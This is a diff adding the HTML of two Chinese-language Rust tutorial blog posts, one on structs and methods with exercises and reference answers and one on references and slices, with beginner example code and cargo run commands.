@@ -190,6 +190,392 @@
   
 
   <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="https://kylinxin.github.io/2026/04/07/Rust%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-07-%E7%BB%93%E6%9E%84%E4%BD%93%E5%92%8C%E6%96%B9%E6%B3%95/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/faction/1.png">
+      <meta itemprop="name" content="Kylinxin">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Kylinxin's Blog">
+      <meta itemprop="description" content="Kylinxin's Blog">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content=" | Kylinxin's Blog">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2026/04/07/Rust%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-07-%E7%BB%93%E6%9E%84%E4%BD%93%E5%92%8C%E6%96%B9%E6%B3%95/" class="post-title-link" itemprop="url">Rust学习笔记 07：结构体和方法</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2026-04-07 09:00:00" itemprop="dateCreated datePublished" datetime="2026-04-07T09:00:00+08:00">2026-04-07</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2026-05-06 19:50:00" itemprop="dateModified" datetime="2026-05-06T19:50:00+08:00">2026-05-06</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/Rust/" itemprop="url" rel="index"><span itemprop="name">Rust</span></a>
+        </span>
+    </span>
+
+  
+    <span class="post-meta-break"></span>
+    <span class="post-meta-item" title="本文字数">
+      <span class="post-meta-item-icon">
+        <i class="far fa-file-word"></i>
+      </span>
+      <span class="post-meta-item-text">本文字数：</span>
+      <span>1.2k</span>
+    </span>
+    <span class="post-meta-item" title="阅读时长">
+      <span class="post-meta-item-icon">
+        <i class="far fa-clock"></i>
+      </span>
+      <span class="post-meta-item-text">阅读时长 &asymp;</span>
+      <span>4 分钟</span>
+    </span>
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <p>对应代码文件：<code>src/bin/07_structs_methods.rs</code></p>
+<p>运行命令：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cargo run --bin lesson07_structs_methods</span><br></pre></td></tr></table></figure>
+
+<h2 id="学习目标"><a href="#学习目标" class="headerlink" title="学习目标"></a>学习目标</h2><p>结构体用于把相关数据组合成有名字的类型。方法则把和这个类型相关的行为放在一起。</p>
+<p>Rust 没有传统面向对象里的类，但结构体加 <code>impl</code> 可以表达清晰的数据和行为边界。</p>
+<ul>
+<li>掌握命名字段结构体的定义和创建。</li>
+<li>理解字段访问、结构体更新语法和派生调试输出。</li>
+<li>掌握 <code>impl</code>、方法和关联函数。</li>
+<li>区分 <code>self</code>、<code>&amp;self</code> 和 <code>&amp;mut self</code>。</li>
+</ul>
+<h2 id="核心概念速查"><a href="#核心概念速查" class="headerlink" title="核心概念速查"></a>核心概念速查</h2><table>
+<thead>
+<tr>
+<th>术语</th>
+<th>基本意思</th>
+<th>本节用途</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>结构体 struct</td>
+<td>把多个字段组合成一个自定义类型。</td>
+<td><code>User &#123; name, active &#125;</code> 表示一个用户对象。</td>
+</tr>
+<tr>
+<td>字段 field</td>
+<td>结构体内部的命名数据。</td>
+<td><code>user.name</code> 访问 <code>name</code> 字段。</td>
+</tr>
+<tr>
+<td>方法 method</td>
+<td>定义在 <code>impl</code> 中，第一个参数是 <code>self</code> 相关形式的函数。</td>
+<td><code>user.summary()</code> 是方法调用。</td>
+</tr>
+<tr>
+<td>关联函数 associated function</td>
+<td>定义在 <code>impl</code> 中，但不接收 <code>self</code>。</td>
+<td>常用于构造函数，如 <code>User::new()</code>。</td>
+</tr>
+<tr>
+<td>derive</td>
+<td>让编译器自动生成常见能力。</td>
+<td><code>#[derive(Debug)]</code> 允许用 <code>&#123;:?&#125;</code> 打印。</td>
+</tr>
+</tbody></table>
+<h2 id="完整源码"><a href="#完整源码" class="headerlink" title="完整源码"></a>完整源码</h2><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#[derive(Debug)]</span></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">User</span> &#123;</span><br><span class="line">    username: <span class="type">String</span>,</span><br><span class="line">    email: <span class="type">String</span>,</span><br><span class="line">    active: <span class="type">bool</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">impl</span> <span class="title class_">User</span> &#123;</span><br><span class="line">    <span class="comment">// 关联函数不接收 self，常用于构造值。</span></span><br><span class="line">    <span class="keyword">fn</span> <span class="title function_">new</span>(username: &amp;<span class="type">str</span>, email: &amp;<span class="type">str</span>) <span class="punctuation">-&gt;</span> <span class="keyword">Self</span> &#123;</span><br><span class="line">        <span class="keyword">Self</span> &#123;</span><br><span class="line">            username: username.<span class="title function_ invoke__">to_string</span>(),</span><br><span class="line">            email: email.<span class="title function_ invoke__">to_string</span>(),</span><br><span class="line">            active: <span class="literal">true</span>,</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 方法的第一个参数是 &amp;self，用于读取实例数据。</span></span><br><span class="line">    <span class="keyword">fn</span> <span class="title function_">summary</span>(&amp;<span class="keyword">self</span>) <span class="punctuation">-&gt;</span> <span class="type">String</span> &#123;</span><br><span class="line">        <span class="built_in">format!</span>(<span class="string">&quot;&#123;&#125; &lt;&#123;&#125;&gt;&quot;</span>, <span class="keyword">self</span>.username, <span class="keyword">self</span>.email)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// &amp;mut self 方法可以修改实例。</span></span><br><span class="line">    <span class="keyword">fn</span> <span class="title function_">deactivate</span>(&amp;<span class="keyword">mut</span> <span class="keyword">self</span>) &#123;</span><br><span class="line">        <span class="keyword">self</span>.active = <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">fn</span> <span class="title function_">main</span>() &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">user</span> = User::<span class="title function_ invoke__">new</span>(<span class="string">&quot;kylin&quot;</span>, <span class="string">&quot;kylin@example.com&quot;</span>);</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;用户: &#123;&#125;&quot;</span>, user.<span class="title function_ invoke__">summary</span>());</span><br><span class="line"></span><br><span class="line">    user.<span class="title function_ invoke__">deactivate</span>();</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;停用后: &#123;user:?&#125;&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 结构体更新语法可以复用已有字段。</span></span><br><span class="line">    <span class="keyword">let</span> <span class="variable">another</span> = User &#123;</span><br><span class="line">        username: <span class="string">&quot;rustacean&quot;</span>.<span class="title function_ invoke__">to_string</span>(),</span><br><span class="line">        ..user</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;新用户: &#123;another:?&#125;&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="运行与观察"><a href="#运行与观察" class="headerlink" title="运行与观察"></a>运行与观察</h2><p>使用 <code>cargo run --bin lesson07_structs_methods</code> 可以只运行本节示例。</p>
+<p>这里的 <code>--bin</code> 后面写的是 <code>Cargo.toml</code> 中声明的目标名，不是 <code>.rs</code> 文件名。文件名用于组织源码，bin 名用于 Cargo 运行。</p>
+<p>建议初学时先直接运行，再修改一两行代码观察编译器提示。Rust 的错误信息通常会指出所有权、类型或借用规则哪里不满足。</p>
+<h2 id="逐段解读"><a href="#逐段解读" class="headerlink" title="逐段解读"></a>逐段解读</h2><h3 id="定义结构体"><a href="#定义结构体" class="headerlink" title="定义结构体"></a>定义结构体</h3><p><code>struct User</code> 定义 <code>name</code>、<code>email</code>、<code>active</code> 等字段。</p>
+<h3 id="创建实例"><a href="#创建实例" class="headerlink" title="创建实例"></a>创建实例</h3><p><code>User &#123; ... &#125;</code> 给每个字段赋值，得到具体用户。</p>
+<h3 id="实现方法"><a href="#实现方法" class="headerlink" title="实现方法"></a>实现方法</h3><p><code>impl User</code> 中的 <code>summary(&amp;self)</code> 读取字段并返回字符串。</p>
+<h3 id="可变方法"><a href="#可变方法" class="headerlink" title="可变方法"></a>可变方法</h3><p><code>deactivate(&amp;mut self)</code> 修改用户状态，需要可变实例。</p>
+<h2 id="专有词语详解"><a href="#专有词语详解" class="headerlink" title="专有词语详解"></a>专有词语详解</h2><h3 id="结构体-struct"><a href="#结构体-struct" class="headerlink" title="结构体 struct"></a>结构体 struct</h3><p>把多个字段组合成一个自定义类型。</p>
+<p><code>User &#123; name, active &#125;</code> 表示一个用户对象。</p>
+<h3 id="字段-field"><a href="#字段-field" class="headerlink" title="字段 field"></a>字段 field</h3><p>结构体内部的命名数据。</p>
+<p><code>user.name</code> 访问 <code>name</code> 字段。</p>
+<h3 id="方法-method"><a href="#方法-method" class="headerlink" title="方法 method"></a>方法 method</h3><p>定义在 <code>impl</code> 中，第一个参数是 <code>self</code> 相关形式的函数。</p>
+<p><code>user.summary()</code> 是方法调用。</p>
+<h3 id="关联函数-associated-function"><a href="#关联函数-associated-function" class="headerlink" title="关联函数 associated function"></a>关联函数 associated function</h3><p>定义在 <code>impl</code> 中，但不接收 <code>self</code>。</p>
+<p>常用于构造函数，如 <code>User::new()</code>。</p>
+<h3 id="derive"><a href="#derive" class="headerlink" title="derive"></a>derive</h3><p>让编译器自动生成常见能力。</p>
+<p><code>#[derive(Debug)]</code> 允许用 <code>&#123;:?&#125;</code> 打印。</p>
+<h2 id="初学者拓展"><a href="#初学者拓展" class="headerlink" title="初学者拓展"></a>初学者拓展</h2><p><code>&amp;self</code> 是 <code>self: &amp;Self</code> 的简写，表示方法只借用实例。</p>
+<p><code>&amp;mut self</code> 表示方法会修改实例。调用它的变量必须是 <code>mut</code>。</p>
+<p><code>self</code> 表示方法取得实例所有权。调用后原实例通常不能再使用。</p>
+<p>结构体更新语法 <code>..other</code> 可能移动未 Copy 字段的所有权，使用时要注意后续是否还要用原实例。</p>
+<h2 id="常见误区"><a href="#常见误区" class="headerlink" title="常见误区"></a>常见误区</h2><ul>
+<li>不要忘记给需要修改的实例写 <code>let mut user</code>。</li>
+<li>不要把关联函数和方法混淆。有关联函数用 <code>Type::function()</code> 调用。</li>
+<li><code>Debug</code> 输出适合调试，不等同于面向用户的格式化文本。</li>
+<li>字段可见性默认私有。模块章节会进一步讲 <code>pub</code>。</li>
+</ul>
+<h2 id="进阶练习与参考答案"><a href="#进阶练习与参考答案" class="headerlink" title="进阶练习与参考答案"></a>进阶练习与参考答案</h2><h3 id="练习-1：定义书籍结构体"><a href="#练习-1：定义书籍结构体" class="headerlink" title="练习 1：定义书籍结构体"></a>练习 1：定义书籍结构体</h3><p>要求：定义 <code>Book</code>，包含标题、作者、页数，并写摘要方法。</p>
+<p>参考答案：</p>
+<figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#[derive(Debug)]</span></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">Book</span> &#123;</span><br><span class="line">    title: <span class="type">String</span>,</span><br><span class="line">    author: <span class="type">String</span>,</span><br><span class="line">    pages: <span class="type">u32</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">impl</span> <span class="title class_">Book</span> &#123;</span><br><span class="line">    <span class="keyword">fn</span> <span class="title function_">summary</span>(&amp;<span class="keyword">self</span>) <span class="punctuation">-&gt;</span> <span class="type">String</span> &#123;</span><br><span class="line">        <span class="built_in">format!</span>(<span class="string">&quot;《&#123;&#125;》 by &#123;&#125;, &#123;&#125; 页&quot;</span>, <span class="keyword">self</span>.title, <span class="keyword">self</span>.author, <span class="keyword">self</span>.pages)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">fn</span> <span class="title function_">main</span>() &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">book</span> = Book &#123; title: <span class="type">String</span>::<span class="title function_ invoke__">from</span>(<span class="string">&quot;Rust Book&quot;</span>), author: <span class="type">String</span>::<span class="title function_ invoke__">from</span>(<span class="string">&quot;Steve&quot;</span>), pages: <span class="number">500</span> &#125;;</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;&#123;&#125;&quot;</span>, book.<span class="title function_ invoke__">summary</span>());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>解释：<code>summary(&amp;self)</code> 只读取字段，所以不需要取得所有权。</p>
+<h3 id="练习-2：写构造函数"><a href="#练习-2：写构造函数" class="headerlink" title="练习 2：写构造函数"></a>练习 2：写构造函数</h3><p>要求：为 <code>Book</code> 增加 <code>new</code> 关联函数。</p>
+<p>参考答案：</p>
+<figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">Book</span> &#123;</span><br><span class="line">    title: <span class="type">String</span>,</span><br><span class="line">    pages: <span class="type">u32</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">impl</span> <span class="title class_">Book</span> &#123;</span><br><span class="line">    <span class="keyword">fn</span> <span class="title function_">new</span>(title: &amp;<span class="type">str</span>, pages: <span class="type">u32</span>) <span class="punctuation">-&gt;</span> <span class="keyword">Self</span> &#123;</span><br><span class="line">        <span class="keyword">Self</span> &#123; title: title.<span class="title function_ invoke__">to_string</span>(), pages &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">fn</span> <span class="title function_">main</span>() &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">book</span> = Book::<span class="title function_ invoke__">new</span>(<span class="string">&quot;Rust&quot;</span>, <span class="number">300</span>);</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;&#123;&#125; &#123;&#125;&quot;</span>, book.title, book.pages);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>解释：<code>Self</code> 表示当前实现块对应的类型，也就是 <code>Book</code>。</p>
+<h3 id="练习-3：修改字段"><a href="#练习-3：修改字段" class="headerlink" title="练习 3：修改字段"></a>练习 3：修改字段</h3><p>要求：写方法把任务状态改为完成。</p>
+<p>参考答案：</p>
+<figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">Task</span> &#123;</span><br><span class="line">    title: <span class="type">String</span>,</span><br><span class="line">    done: <span class="type">bool</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">impl</span> <span class="title class_">Task</span> &#123;</span><br><span class="line">    <span class="keyword">fn</span> <span class="title function_">finish</span>(&amp;<span class="keyword">mut</span> <span class="keyword">self</span>) &#123;</span><br><span class="line">        <span class="keyword">self</span>.done = <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">fn</span> <span class="title function_">main</span>() &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">task</span> = Task &#123; title: <span class="type">String</span>::<span class="title function_ invoke__">from</span>(<span class="string">&quot;learn struct&quot;</span>), done: <span class="literal">false</span> &#125;;</span><br><span class="line">    task.<span class="title function_ invoke__">finish</span>();</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;&#123;&#125; &#123;&#125;&quot;</span>, task.title, task.done);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>解释：方法要修改字段，所以接收 <code>&amp;mut self</code>，变量也要声明为 <code>mut</code>。</p>
+<h2 id="相关笔记"><a href="#相关笔记" class="headerlink" title="相关笔记"></a>相关笔记</h2><ul>
+<li><a href="https://kylinxin.github.io/2026/04/06/Rust%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-06-%E5%BC%95%E7%94%A8%E4%B8%8E%E5%88%87%E7%89%87/">Rust学习笔记 06：引用与切片</a></li>
+<li><a href="https://kylinxin.github.io/2026/04/08/Rust%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-08-%E6%9E%9A%E4%B8%BE%E4%B8%8E%E6%A8%A1%E5%BC%8F%E5%8C%B9%E9%85%8D/">Rust学习笔记 08：枚举与模式匹配</a></li>
+</ul>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+        
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="https://kylinxin.github.io/2026/04/06/Rust%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-06-%E5%BC%95%E7%94%A8%E4%B8%8E%E5%88%87%E7%89%87/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/faction/1.png">
+      <meta itemprop="name" content="Kylinxin">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Kylinxin's Blog">
+      <meta itemprop="description" content="Kylinxin's Blog">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content=" | Kylinxin's Blog">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2026/04/06/Rust%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-06-%E5%BC%95%E7%94%A8%E4%B8%8E%E5%88%87%E7%89%87/" class="post-title-link" itemprop="url">Rust学习笔记 06：引用与切片</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2026-04-06 09:00:00" itemprop="dateCreated datePublished" datetime="2026-04-06T09:00:00+08:00">2026-04-06</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2026-05-06 19:50:00" itemprop="dateModified" datetime="2026-05-06T19:50:00+08:00">2026-05-06</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/Rust/" itemprop="url" rel="index"><span itemprop="name">Rust</span></a>
+        </span>
+    </span>
+
+  
+    <span class="post-meta-break"></span>
+    <span class="post-meta-item" title="本文字数">
+      <span class="post-meta-item-icon">
+        <i class="far fa-file-word"></i>
+      </span>
+      <span class="post-meta-item-text">本文字数：</span>
+      <span>1.2k</span>
+    </span>
+    <span class="post-meta-item" title="阅读时长">
+      <span class="post-meta-item-icon">
+        <i class="far fa-clock"></i>
+      </span>
+      <span class="post-meta-item-text">阅读时长 &asymp;</span>
+      <span>5 分钟</span>
+    </span>
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <p>对应代码文件：<code>src/bin/06_references_slices.rs</code></p>
+<p>运行命令：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cargo run --bin lesson06_references_slices</span><br></pre></td></tr></table></figure>
+
+<h2 id="学习目标"><a href="#学习目标" class="headerlink" title="学习目标"></a>学习目标</h2><p>本节继续所有权之后的主题：引用和切片。引用让你借用整个值，切片让你借用值的一部分。</p>
+<p>切片不拥有数据，只描述一段连续区域。它常用于字符串、数组和 Vec 的只读访问。</p>
+<ul>
+<li>理解 <code>&amp;T</code> 和 <code>&amp;mut T</code> 的含义。</li>
+<li>知道切片 <code>&amp;str</code>、<code>&amp;[T]</code> 是借用的一段连续数据。</li>
+<li>掌握字符串切片和数组切片的范围语法。</li>
+<li>会通过缩小作用域减少借用冲突。</li>
+</ul>
+<h2 id="核心概念速查"><a href="#核心概念速查" class="headerlink" title="核心概念速查"></a>核心概念速查</h2><table>
+<thead>
+<tr>
+<th>术语</th>
+<th>基本意思</th>
+<th>本节用途</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>引用 reference</td>
+<td>指向某个值的借用，不拥有该值。</td>
+<td><code>&amp;name</code> 是不可变引用。</td>
+</tr>
+<tr>
+<td>可变引用 mutable reference</td>
+<td>可以修改借来的值。</td>
+<td><code>&amp;mut text</code> 必须配合可变变量使用。</td>
+</tr>
+<tr>
+<td>切片 slice</td>
+<td>引用集合中连续的一部分。</td>
+<td><code>&amp;numbers[1..4]</code> 借用索引 1 到 3。</td>
+</tr>
+<tr>
+<td>字符串切片 &amp;str</td>
+<td>指向 UTF-8 字符串内容的一段视图。</td>
+<td>字符串字面量的类型就是 <code>&amp;str</code>。</td>
+</tr>
+<tr>
+<td>范围 range</td>
+<td><code>start..end</code> 表示左闭右开区间。</td>
+<td><code>0..5</code> 包含 0，不包含 5。</td>
+</tr>
+</tbody></table>
+<h2 id="完整源码"><a href="#完整源码" class="headerlink" title="完整源码"></a>完整源码</h2><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">fn</span> <span class="title function_">first_word</span>(text: &amp;<span class="type">str</span>) <span class="punctuation">-&gt;</span> &amp;<span class="type">str</span> &#123;</span><br><span class="line">    <span class="comment">// bytes() 逐字节遍历字符串。这里只处理 ASCII 空格边界。</span></span><br><span class="line">    <span class="keyword">for</span> (index, byte) <span class="keyword">in</span> text.<span class="title function_ invoke__">bytes</span>().<span class="title function_ invoke__">enumerate</span>() &#123;</span><br><span class="line">        <span class="keyword">if</span> byte == <span class="string">b&#x27; &#x27;</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> &amp;text[..index];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    text</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">fn</span> <span class="title function_">main</span>() &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">message</span> = <span class="type">String</span>::<span class="title function_ invoke__">from</span>(<span class="string">&quot;Rust ownership&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// &amp;message 创建不可变引用，可以读但不能改。</span></span><br><span class="line">    <span class="keyword">let</span> <span class="variable">ref1</span> = &amp;message;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">ref2</span> = &amp;message;</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;两个不可变引用: &#123;ref1&#125;, &#123;ref2&#125;&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 切片引用一段连续数据，不拥有数据。</span></span><br><span class="line">    <span class="keyword">let</span> <span class="variable">word</span> = <span class="title function_ invoke__">first_word</span>(&amp;message);</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;第一个单词: &#123;word&#125;&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> <span class="variable">numbers</span> = [<span class="number">10</span>, <span class="number">20</span>, <span class="number">30</span>, <span class="number">40</span>, <span class="number">50</span>];</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">middle</span> = &amp;numbers[<span class="number">1</span>..<span class="number">4</span>];</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;数组切片: &#123;middle:?&#125;&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">name</span> = <span class="type">String</span>::<span class="title function_ invoke__">from</span>(<span class="string">&quot;Rust&quot;</span>);</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// 可变引用的作用域越小，越容易避免借用冲突。</span></span><br><span class="line">        <span class="keyword">let</span> <span class="variable">mutable_ref</span> = &amp;<span class="keyword">mut</span> name;</span><br><span class="line">        mutable_ref.<span class="title function_ invoke__">push_str</span>(<span class="string">&quot;acean&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;可变引用修改后: &#123;name&#125;&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="运行与观察"><a href="#运行与观察" class="headerlink" title="运行与观察"></a>运行与观察</h2><p>使用 <code>cargo run --bin lesson06_references_slices</code> 可以只运行本节示例。</p>
+<p>这里的 <code>--bin</code> 后面写的是 <code>Cargo.toml</code> 中声明的目标名，不是 <code>.rs</code> 文件名。文件名用于组织源码，bin 名用于 Cargo 运行。</p>
+<p>建议初学时先直接运行，再修改一两行代码观察编译器提示。Rust 的错误信息通常会指出所有权、类型或借用规则哪里不满足。</p>
+<h2 id="逐段解读"><a href="#逐段解读" class="headerlink" title="逐段解读"></a>逐段解读</h2><h3 id="不可变引用"><a href="#不可变引用" class="headerlink" title="不可变引用"></a>不可变引用</h3><p><code>let reference = &amp;message;</code> 借用整个字符串并读取。</p>
+<h3 id="字符串切片"><a href="#字符串切片" class="headerlink" title="字符串切片"></a>字符串切片</h3><p><code>&amp;message[0..4]</code> 借用字符串前四个字节对应的内容。</p>
+<h3 id="数组切片"><a href="#数组切片" class="headerlink" title="数组切片"></a>数组切片</h3><p><code>&amp;numbers[1..4]</code> 借用数组中一段连续元素。</p>
+<h3 id="可变引用作用域"><a href="#可变引用作用域" class="headerlink" title="可变引用作用域"></a>可变引用作用域</h3><p>把 <code>&amp;mut text</code> 放进小代码块，让借用尽快结束。</p>
